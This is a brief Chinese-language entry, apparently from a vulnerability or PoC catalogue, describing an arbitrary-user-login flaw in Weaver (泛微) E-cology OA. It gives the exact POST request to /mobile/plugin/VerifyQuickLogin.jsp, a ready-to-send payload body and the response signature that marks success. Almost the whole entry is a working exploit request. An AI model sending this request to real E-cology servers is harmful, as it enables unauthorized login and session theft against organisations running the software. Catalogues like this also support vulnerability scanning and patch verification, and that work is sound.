# 泛微E-cology存在任意用户登录漏洞

泛微OA ｜ 其他 ｜ —
- **请求**：`POST /mobile/plugin/VerifyQuickLogin.jsp HTTP/1.1`

**Payload**
```
identifier=1&language=1&ipaddress=1.1.1.1
```
- **响应特征**：-1 sessionkey